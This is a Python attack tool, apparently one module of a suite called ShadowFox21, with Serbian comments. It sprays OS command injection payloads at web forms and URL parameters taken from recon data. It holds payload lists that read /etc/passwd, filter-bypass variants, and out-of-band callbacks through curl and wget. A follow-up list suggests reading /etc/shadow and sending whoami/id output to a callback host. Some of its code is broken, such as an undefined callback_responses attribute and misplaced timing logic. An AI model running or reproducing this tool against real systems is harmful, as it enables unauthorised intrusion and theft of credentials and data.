
#!/usr/bin/env python3
"""
ShadowFox21 - Command Injection Attack Module
============================================
Napadni modul za testiranje OS Command Injection vulnerabilities
Učitava podatke iz recon JSON-a i generiše attack rezultate
"""

import requests
import json
import time
import threading
import subprocess
import socket
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from datetime import datetime
import re
from queue import Queue
import argparse
from pathlib import Path
import base64
import random
import hashlib
class CommandInjectionAttacker:
    def __init__(self, input_json, threads=8, delay=1.0, callback_host=None, output=None, manual_path=None, args=None):
        self.input_json = input_json
        self.threads = threads
        self.delay = delay
        self.callback_host = callback_host
        self.output = output
        self.manual_path = manual_path
        self.args = args

        self.vulnerable_endpoints = []
        self.tested_endpoints = []
        self.attack_results = []
        self.mutations_ready = []
        self.errors = []

        self.attack_queue = Queue()
        self.lock = threading.Lock()

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        self.payloads = self.load_cmdi_payloads()
        self.test_markers = {}

        print(f"💻 Command Injection Attacker inicijalizovan")
        print(f"🎯 Threads: {threads}, Delay: {delay}s")
        print(f"🚀 Payloads loaded: {len(self.payloads)}")
        if callback_host:
            print(f"📡 Callback host: {callback_host}")
    def load_cmdi_payloads(self):
        """Učitava Command Injection payloads"""
        payloads = {
            'basic_linux': [
                '; id',
                '| id',
                '&& id',
                '|| id',
                '; whoami',
                '| whoami',
                '&& whoami',
                '|| whoami',
                '; uname -a',
                '| uname -a',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '; ls -la',
                '| ls -la'
            ],
            'basic_windows': [
                '; dir',
                '| dir',
                '&& dir',
                '|| dir',
                '; whoami',
                '| whoami',
                '&& whoami',
                '|| whoami',
                '; type C:\\Windows\\System32\\drivers\\etc\\hosts',
                '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
                '; systeminfo',
                '| systeminfo'
            ],
            'time_based_linux': [
                '; sleep 5',
                '| sleep 5',
                '&& sleep 5',
                '|| sleep 5',
                '; ping -c 3 127.0.0.1',
                '| ping -c 3 127.0.0.1',
                '`sleep 5`',
                '$(sleep 5)'
            ],
            'time_based_windows': [
                '; timeout 5',
                '| timeout 5',
                '&& timeout 5',
                '|| timeout 5',
                '; ping -n 3 127.0.0.1',
                '| ping -n 3 127.0.0.1',
                '&& ping -n 3 127.0.0.1'
            ],
            'output_based': [
                '; echo "CMDI_TEST_12345"',
                '| echo "CMDI_TEST_12345"',
                '&& echo "CMDI_TEST_12345"',
                '|| echo "CMDI_TEST_12345"',
                '`echo "CMDI_TEST_12345"`',
                '$(echo "CMDI_TEST_12345")',
                '; echo CMDI_TEST_12345',
                '| echo CMDI_TEST_12345'
            ],
            'blind_oob': [
                '; nslookup {callback_host}',
                '| nslookup {callback_host}',
                '&& nslookup {callback_host}',
                '|| nslookup {callback_host}',
                '; dig {callback_host}',
                '| dig {callback_host}',
                '; curl http://{callback_host}/cmdi_test',
                '| curl http://{callback_host}/cmdi_test',
                '; wget http://{callback_host}/cmdi_test',
                '| wget http://{callback_host}/cmdi_test'
            ],
            'encoding_bypass': [
                '%3B%20id',  # ; id (URL encoded)
                '%7C%20id',  # | id (URL encoded)
                '%26%26%20id',  # && id (URL encoded)
                '%3B%20%77%68%6F%61%6D%69',  # ; whoami (URL encoded)
                '&#59; id',  # ; id (HTML encoded)
                '&#124; id',  # | id (HTML encoded)
            ],
            'filter_bypass': [
                ';i\\d',
                ';w\\hoami',
                ';c\\at /etc/passwd',
                ';/bin/i\\d',
                ';/usr/bin/i\\d',
                '|i""d',
                '|w\'\'hoami',
                '|ca\'\'t /etc/passwd'
            ]
        }
        
        # Kombinuje sve payloads
        all_payloads = []
        for category, payload_list in payloads.items():
            for payload in payload_list:
                # Zamenjuje callback placeholder
                if self.callback_host and '{callback_host}' in payload:
                    payload = payload.replace('{callback_host}', self.callback_host)
                
                all_payloads.append({
                    'payload': payload,
                    'category': category,
                    'encoded': base64.b64encode(payload.encode()).decode(),
                    'marker': self.generate_unique_marker()
                })
        
        return all_payloads

    def generate_unique_marker(self):
        """Generiše jedinstveni marker za testiranje"""
        timestamp = str(int(time.time() * 1000))
        random_str = str(random.randint(10000, 99999))
        return f"CMDI_{timestamp}_{random_str}"

    def load_recon_data(self):
        """Učitava podatke iz recon JSON fajla"""
        try:
            with open(self.input_json, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            print(f"📂 Učitani recon podaci iz: {self.input_json}")
            print(f"   • URLs: {len(data.get('results', {}).get('urls', []))}")
            print(f"   • Forms: {len(data.get('results', {}).get('forms', []))}")
            
            return data
        except Exception as e:
            print(f"❌ Greška pri učitavanju: {e}")
            return None

    def extract_attack_targets(self, recon_data):
        """Izvlači mete za napad iz recon podataka"""
        targets = []
        
        # Forme - posebno fokus na file upload i input polja
        forms = recon_data.get('results', {}).get('forms', [])
        for form in forms:
            # Analizira formu za potencijalne cmd injection tačke
            form_content = form.get('form_content', '').lower()
            suspicious_indicators = [
                'file', 'upload', 'path', 'filename', 'command',
                'cmd', 'exec', 'system', 'shell', 'ping', 'nslookup'
            ]
            
            risk_score = sum(1 for indicator in suspicious_indicators if indicator in form_content)
            
            targets.append({
                'type': 'form',
                'url': form['url'],
                'action': form['action'],
                'method': form['method'],
                'inputs': form['inputs'],
                'form_content': form['form_content'],
                'risk_score': risk_score,
                'suspicious_fields': [ind for ind in suspicious_indicators if ind in form_content]
            })
        
        # URL-ovi sa parametrima - fokus na file i system parametre
        urls = recon_data.get('results', {}).get('urls', [])
        for url in urls:
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                
                # Analizira parametre za cmd injection potencijal
                suspicious_params = []
                for param_name in params.keys():
                    param_lower = param_name.lower()
                    if any(keyword in param_lower for keyword in 
                          ['file', 'path', 'cmd', 'exec', 'system', 'ping', 'host', 'ip']):
                        suspicious_params.append(param_name)
                
                if suspicious_params or len(params) > 0:  # Testira sve parametre
                    targets.append({
                        'type': 'url_param',
                        'url': url,
                        'base_url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        'params': params,
                        'suspicious_params': suspicious_params,
                        'risk_score': len(suspicious_params) * 2
                    })
        
        # Sortira po risk score
        targets.sort(key=lambda x: x.get('risk_score', 0), reverse=True)
        
        print(f"🎯 Pronađeno {len(targets)} meta za Command Injection")
        high_risk = [t for t in targets if t.get('risk_score', 0) > 2]
        print(f"⚠️  Visoko rizične mete: {len(high_risk)}")
        
        return targets

    def detect_cmdi_vulnerability(self, response_normal, response_attack, payload_info, start_time, end_time, target):
        """Detektuje Command Injection vulnerability"""
        vulnerability = {
            'detected': False,
            'type': 'none',
            'confidence': 0,
            'evidence': []
        }
        
        if not response_attack:
            return vulnerability
        
        # Time-based detection
        response_time = end_time - start_time
        if payload_info['category'].startswith('time_based') and response_time > 4.0:
            vulnerability['detected'] = True
            vulnerability['type'] = 'time_based_cmdi'
            vulnerability['confidence'] = 85
            vulnerability['evidence'].append(f"Time delay detected: {response_time:.2f}s")
        
        # Output-based detection
        if payload_info['category'] == 'output_based':
            test_outputs = [
                'CMDI_TEST_12345',
                'uid=', 'gid=',  # Linux id command
                'root:', 'bin:', 'daemon:',  # /etc/passwd
                'Windows', 'System32',  # Windows dir
                'Volume Serial Number',  # Windows dir output
                'Linux', 'GNU',  # uname output
            ]
            
            content_lower = response_attack.text.lower()
            for output in test_outputs:
                if output.lower() in content_lower:
                    vulnerability['detected'] = True
                    vulnerability['type'] = 'output_based_cmdi'
                    vulnerability['confidence'] = 95
                    vulnerability['evidence'].append(f"Command output detected: {output}")
                    break
        
        # Error-based detection za command injection
        error_indicators = [
            'sh: ', 'bash: ', 'cmd: ',
            'command not found',
            'is not recognized as an internal or external command',
            'syntax error',
            'unexpected token',
            'permission denied',
            '/bin/sh',
            'cannot execute'
        ]
        
        if response_attack.text:
            content_lower = response_attack.text.lower()
            for error in error_indicators:
                if error.lower() in content_lower:
                    vulnerability['detected'] = True
                    vulnerability['type'] = 'error_based_cmdi'
                    vulnerability['confidence'] = 75
                    vulnerability['evidence'].append(f"Command error detected: {error}")
                    break
        
        # Content difference analysis
        if response_normal and response_attack:
            len_normal = len(response_normal.text)
            len_attack = len(response_attack.text)
            
            if len_normal > 0:
                diff_ratio = abs(len_attack - len_normal) / len_normal
                if diff_ratio > 0.15:  # 15% razlika
                    if not vulnerability['detected']:  # Samo ako nije već detektovano
                        vulnerability['detected'] = True
                        vulnerability['type'] = 'content_based_cmdi'
                        vulnerability['confidence'] = 60
                        vulnerability['evidence'].append(f"Significant content difference: {diff_ratio:.2%}")
        
        # Callback detection (za OOB payloads)
        if payload_info['category'] == 'blind_oob' and self.callback_host:
            # Ovde bi trebalo proveriti callback server logs
            # Za sada samo označava kao potencijalno ranjivo
            if payload_info['marker'] in self.callback_responses:
                vulnerability['detected'] = True
                vulnerability['type'] = 'blind_oob_cmdi'
                vulnerability['confidence'] = 90
                vulnerability['evidence'].append("Out-of-band callback received")
        
        return vulnerability

    def test_cmdi_endpoint(self, target, payload_info):
        """Testira pojedinačni endpoint za Command Injection"""
        try:
            # Prvo dobija normalnu response
            if target['type'] == 'form':
                if target['method'] == 'POST':
                    response_normal = self.session.post(target['action'], data={}, timeout=10)
                else:
                    response_normal = self.session.get(target['action'], timeout=10)
            else:
                response_normal = self.session.get(target['base_url'], timeout=10)
            
            # Zatim testira sa payload
            start_time = time.time()
            
            if target['type'] == 'form':
                # Testira različite input kombinacije
                attack_data = {}
                
                # Ako ima suspicious fields, fokusira se na njih
                if target.get('suspicious_fields'):
                    for field in ['file', 'filename', 'path', 'cmd', 'command']:
                        attack_data[field] = payload_info['payload']
                else:
                    # Testira generičke fieldove
                    for field in ['input', 'data', 'value', 'param', 'file', 'cmd']:
                        attack_data[field] = payload_info['payload']
                
                if target['method'] == 'POST':
                    response_attack = self.session.post(target['action'], data=attack_data, timeout=15)
                else:
                    response_attack = self.session.get(target['action'], params=attack_data, timeout=15)
            
            else:
                # Za URL parametre
                attack_params = {}
                
                if target.get('suspicious_params'):
                    # Fokusira se na suspicious parametre
                    for param in target['suspicious_params']:
                        attack_params[param] = payload_info['payload']
                else:
                    # Testira sve parametre
                    for param in target['params'].keys():
                        attack_params[param] = payload_info['payload']
                
                attack_url = f"{target['base_url']}?{urlencode(attack_params)}"
                response_attack = self.session.get(attack_url, timeout=15)
            
            end_time = time.time()
            
            # Detektuje vulnerability
            vulnerability = self.detect_cmdi_vulnerability(
                response_normal, response_attack, payload_info, start_time, end_time, target
            )
            
            # Rezultat testa
            test_result = {
                'target': target,
                'payload': payload_info,
                'vulnerability': vulnerability,
                'responses': {
                    'normal_status': response_normal.status_code if response_normal else None,
                    'attack_status': response_attack.status_code if response_attack else None,
                    'response_time': end_time - start_time,
                    'normal_length': len(response_normal.text) if response_normal else 0,
                    'attack_length': len(response_attack.text) if response_attack else 0,
                    'attack_headers': dict(response_attack.headers) if response_attack else {}
                },
                'timestamp': datetime.now().isoformat(),
                'risk_assessment': {
                    'target_risk_score': target.get('risk_score', 0),
                    'payload_category': payload_info['category'],
                    'overall_risk': 'HIGH' if vulnerability['confidence'] > 80 else 'MEDIUM' if vulnerability['confidence'] > 60 else 'LOW'
                }
            }
            
            with self.lock:
                self.attack_results.append(test_result)
                endpoint_key = f"{target['url']}_{payload_info['category']}"
                self.tested_endpoints.append(endpoint_key)
                
                if vulnerability['detected']:
                    self.vulnerable_endpoints.append(test_result)
                    print(f"🚨 CMDI VULN: {target['url']} - {vulnerability['type']} ({vulnerability['confidence']}%)")
                    
                    # Priprema za mutations
                    mutation_data = {
                        'endpoint': target['url'],
                        'vulnerability_type': vulnerability['type'],
                        'successful_payload': payload_info['payload'],
                        'confidence': vulnerability['confidence'],
                        'target_info': target,
                        'attack_vector': payload_info['category'],
                        'exploitation_ready': True,
                        'suggested_commands': self.suggest_exploitation_commands(vulnerability['type']),
                        'risk_level': test_result['risk_assessment']['overall_risk']
                    }
                    self.mutations_ready.append(mutation_data)
        
        except Exception as e:
            with self.lock:
                self.errors.append({
                    'target': target['url'],
                    'payload': payload_info['payload'],
                    'error': str(e),
                    'timestamp': datetime.now().isoformat()
                })

    def suggest_exploitation_commands(self, vuln_type):
        """Predlaže komande za eksploataciju"""
        suggestions = {
            'time_based_cmdi': [
                '; cat /etc/passwd',
                '; ls -la /',
                '; whoami',
                '; uname -a',
                '; ps aux'
            ],
            'output_based_cmdi': [
                '; cat /etc/shadow',
                '; find / -name "*.conf" 2>/dev/null',
                '; netstat -tulpn',
                '; cat /proc/version',
                '; env'
            ],
            'error_based_cmdi': [
                '; id',
                '; pwd',
                '; ls',
                '; cat /etc/issue'
            ],
            'blind_oob_cmdi': [
                f'; curl http://{self.callback_host}/exfil/$(whoami)',
                f'; wget http://{self.callback_host}/exfil/$(id)',
                f'; nslookup $(whoami).{self.callback_host}' if self.callback_host else '; whoami'
            ]
        }
        
        return suggestions.get(vuln_type, ['; whoami', '; id', '; ls'])

    def attack_worker(self):
        """Worker thread za napade"""
        while True:
            try:
                target, payload_info = self.attack_queue.get(timeout=5)
                self.test_cmdi_endpoint(target, payload_info)
                self.attack_queue.task_done()
                time.sleep(self.delay)
            except:
                break

    def run_attack(self):
        """Pokreće Command Injection napade"""
        print(f"\n🚀 Početak Command Injection napada...")
        
        # Učitava recon podatke
        recon_data = self.load_recon_data()
        if not recon_data:
            return False
        
        # Izvlači mete
        targets = self.extract_attack_targets(recon_data)
        # Ako postoji ručna putanja, dodaj je direktno
        if hasattr(self.args, 'manual_path') and self.args.manual_path:
            base_url = recon_data.get("target_info", {}).get("target_url", "")
            full_url = base_url.rstrip("/") + self.args.manual_path
            targets.append({
                "url": full_url,
                "method": "GET",
                "risk_score": 3,
                "source": "manual"
        })
            if not targets:
                print("❌ Nema meta za napad!")
                return False
        
            start_time = time.time()
        
        # Puni queue sa zadacima (prioritet visokim rizicima)
        high_priority_targets = [t for t in targets if t.get('risk_score', 0) > 2]
        normal_targets = [t for t in targets if t.get('risk_score', 0) <= 2]
        
        # Prvo high priority
        for target in high_priority_targets:
            for payload_info in self.payloads:
                self.attack_queue.put((target, payload_info))
        
        # Zatim normalni targets
        for target in normal_targets:
            for payload_info in self.payloads:
                self.attack_queue.put((target, payload_info))
        
        total_tests = len(targets) * len(self.payloads)
        print(f"📊 Ukupno testova: {total_tests}")
        print(f"⚠️  High priority targets: {len(high_priority_targets)}")
        
        # Kreira worker threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Čeka da se završi
        self.attack_queue.join()
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n✅ Command Injection napad završen za {duration:.2f} sekundi")
        print(f"📊 Rezultati:")
        print(f"   • Testirano endpointa: {len(self.tested_endpoints)}")
        print(f"   • Ranjivi endpointi: {len(self.vulnerable_endpoints)}")
        print(f"   • Spremno za mutations: {len(self.mutations_ready)}")
        print(f"   • Greške: {len(self.errors)}")
        
        return True

    def generate_attack_report(self):
        """Generiše JSON izveštaj napada"""
        report = {
            'module': 'command_injection_attack',
            'attack_info': {
                'timestamp': datetime.now().isoformat(),
                'input_file': self.input_json,
                'threads': self.threads,
                'delay': self.delay,
                'callback_host': self.callback_host,
                'payloads_used': len(self.payloads)
            },
            'statistics': {
                'total_tests_performed': len(self.attack_results),
                'vulnerable_endpoints_found': len(self.vulnerable_endpoints),
                'mutation_ready_targets': len(self.mutations_ready),
                'errors_encountered': len(self.errors),
                'high_confidence_vulns': len([v for v in self.vulnerable_endpoints if v['vulnerability']['confidence'] > 80])
            },
            'vulnerabilities': {
                'summary': {},
                'by_risk_level': {},
                'details': self.vulnerable_endpoints
            },
            'mutations_ready': self.mutations_ready,
            'exploitation_guide': {
                'time_based': "Use sleep/timeout commands to confirm execution",
                'output_based': "Commands output is visible in response",
                'error_based': "Command errors reveal execution",
                'blind_oob': "Use callback server to confirm execution"
            },
            'all_test_results': self.attack_results,
            'errors': self.errors
        }
        
        # Summary po tipovima
        vuln_types = {}
        risk_levels = {}
        
        for vuln in self.vulnerable_endpoints:
            vtype = vuln['vulnerability']['type']
            if vtype not in vuln_types:
                vuln_types[vtype] = 0
            vuln_types[vtype] += 1
            
            risk = vuln['risk_assessment']['overall_risk']
            if risk not in risk_levels:
                risk_levels[risk] = 0
            risk_levels[risk] += 1
        
        report['vulnerabilities']['summary'] = vuln_types
        report['vulnerabilities']['by_risk_level'] = risk_levels
        
        return report

    def save_report(self, filename=None):
        """Čuva JSON izveštaj"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"shadowfox_cmdi_attack_{timestamp}.json"
        
        report = self.generate_attack_report()
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 Command Injection izveštaj sačuvan: {filename}")
        return filename

def main():
    parser = argparse.ArgumentParser(description='ShadowFox21 - Command Injection Attack Module')
    parser.add_argument('--manual-path', help='Manual URL path to test (e.g. /admin/)')
    parser.add_argument('input_json', help='Input JSON file from recon module')
    parser.add_argument('-t', '--threads', type=int, default=8, help='Number of threads (default: 8)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between attacks (default: 1.0)')
    parser.add_argument('--callback', help='Callback host for OOB testing (e.g., your.server.com)')
    parser.add_argument('-o', '--output', help='Output JSON file')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("💻 ShadowFox21 - Command Injection Attack Module")
    print("=" * 60)
    
    # Provera da li input fajl postoji
    if not Path(args.input_json).exists():
        print(f"❌ Input fajl ne postoji: {args.input_json}")
        return
    
    # Kreira attacker
    attacker = CommandInjectionAttacker(
        args.input_json,
        args.threads,
        args.delay,
        args.callback,
        args.output,
        args.manual_path,  # ovo dodaj ako postoji ručni unos
        args               # <== ovo OBAVEZNO dodaj poslednje!
    )
    try:
        # Pokreće napad
        if attacker.run_attack():
            # Čuva izveštaj
            attacker.save_report(args.output)
            print(f"\n🎯 Command Injection napad završen uspešno!")
        else:
            print(f"\n❌ Napad neuspešan!")
        
    except KeyboardInterrupt:
        print(f"\n⚠️  Napad prekinut...")
    except Exception as e:
        print(f"\n❌ Greška: {e}")

if __name__ == "__main__":
    main()

